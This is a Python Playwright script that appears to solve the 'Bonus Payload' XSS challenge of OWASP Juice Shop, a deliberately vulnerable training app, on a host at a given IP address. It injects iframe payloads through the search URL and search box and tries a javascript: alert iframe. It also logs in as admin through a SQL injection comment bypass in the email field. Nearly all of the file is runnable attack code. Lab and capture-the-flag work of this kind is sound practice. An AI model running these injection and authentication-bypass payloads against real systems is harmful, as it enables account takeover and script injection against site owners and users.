#!/usr/bin/env python3
"""
Bonus Payload XSS Challenge Solver for OWASP Juice Shop v18
This challenge requires a specific SoundCloud iframe injection
"""

from playwright.sync_api import sync_playwright
import time
import requests

TARGET = "http://66.42.93.220:3000"

def solve_bonus_payload():
    """Solve the Bonus Payload XSS challenge"""
    
    print("🎯 Solving Bonus Payload XSS Challenge")
    print("=" * 60)
    
    # The specific payload for the Bonus Payload challenge
    # This is a SoundCloud iframe that triggers the challenge
    bonus_payload = "<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true\"></iframe>"
    
    print("📝 Payload: SoundCloud iframe injection")
    print("🌐 Starting browser automation...")
    
    with sync_playwright() as p:
        # Launch browser
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()
        
        # Handle any dialogs
        page.on("dialog", lambda dialog: dialog.accept())
        
        # Navigate to main page first
        print("📍 Navigating to Juice Shop...")
        page.goto(TARGET, wait_until="networkidle")
        time.sleep(2)
        
        # Method 1: Direct URL injection
        print("\n🔧 Method 1: Direct URL injection")
        search_url = f"{TARGET}/#/search?q={bonus_payload}"
        print(f"   Injecting via search URL...")
        page.goto(search_url, wait_until="domcontentloaded")
        time.sleep(3)
        
        # Check if we can see any indication of success
        # Take a screenshot for verification
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/bonus_payload_attempt1.png")
        print("   ✅ Payload injected via URL")
        
        # Method 2: Search box injection
        print("\n🔧 Method 2: Search box injection")
        page.goto(f"{TARGET}/#/search", wait_until="networkidle")
        time.sleep(2)
        
        # Try to find and fill the search input
        try:
            # Look for the search input field
            search_input = page.locator('input[type="text"]').first
            if search_input:
                print("   Found search input, injecting payload...")
                search_input.fill(bonus_payload)
                # Trigger search
                search_input.press("Enter")
                time.sleep(3)
                page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/bonus_payload_attempt2.png")
                print("   ✅ Payload injected via search box")
        except:
            print("   ⚠️ Could not find search input")
        
        # Method 3: Using different encoding
        print("\n🔧 Method 3: URL-encoded payload")
        import urllib.parse
        encoded_payload = urllib.parse.quote(bonus_payload, safe='')
        encoded_url = f"{TARGET}/#/search?q={encoded_payload}"
        page.goto(encoded_url, wait_until="domcontentloaded")
        time.sleep(3)
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/bonus_payload_attempt3.png")
        print("   ✅ Encoded payload injected")
        
        browser.close()
    
    print("\n🔍 Checking challenge status via API...")
    
    # Check if challenge is solved
    session = requests.Session()
    
    # Login as admin to check status
    login_payload = {"email": "admin@juice-sh.op'--", "password": "anything"}
    resp = session.post(f"{TARGET}/rest/user/login", json=login_payload)
    if resp.status_code == 200:
        token = resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
    
    # Check challenges
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        bonus_challenge = next((c for c in challenges if 'Bonus' in c.get('name', '')), None)
        
        if bonus_challenge:
            if bonus_challenge.get('solved', False):
                print("\n✅ SUCCESS! Bonus Payload challenge is SOLVED!")
                print(f"   Challenge: {bonus_challenge['name']}")
                print(f"   Category: {bonus_challenge.get('category', 'Unknown')}")
                print(f"   Difficulty: {'⭐' * bonus_challenge.get('difficulty', 1)}")
                return True
            else:
                print("\n⚠️ Challenge not yet marked as solved")
                print("   The payload was injected but may need manual verification")
        else:
            print("\n❓ Could not find Bonus Payload challenge in API")
    
    print("\n📌 Additional attempts...")
    
    # Try alternative payloads
    alternative_payloads = [
        # Original with different encoding
        '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>',
        
        # Simplified version
        '<iframe src="https://w.soundcloud.com/player/?url=https://api.soundcloud.com/tracks/771984076"></iframe>',
        
        # With JavaScript URL
        '<iframe src="javascript:alert(`xss`)"></iframe>',
    ]
    
    for i, payload in enumerate(alternative_payloads, 1):
        print(f"\n   Attempt {i+3}: Alternative payload")
        resp = session.get(f"{TARGET}/#/search?q={payload}")
        time.sleep(1)
    
    print("\n" + "=" * 60)
    print("🎯 Bonus Payload injection complete!")
    print("   Screenshots saved for verification")
    print("   Check http://66.42.93.220:3000/#/score-board")
    
    return False

if __name__ == "__main__":
    result = solve_bonus_payload()
    if result:
        print("\n🎉 Challenge successfully solved!")
    else:
        print("\n📝 Manual verification may be required")
        print("   The exact SoundCloud iframe has been injected")
        print("   Check the scoreboard for confirmation")
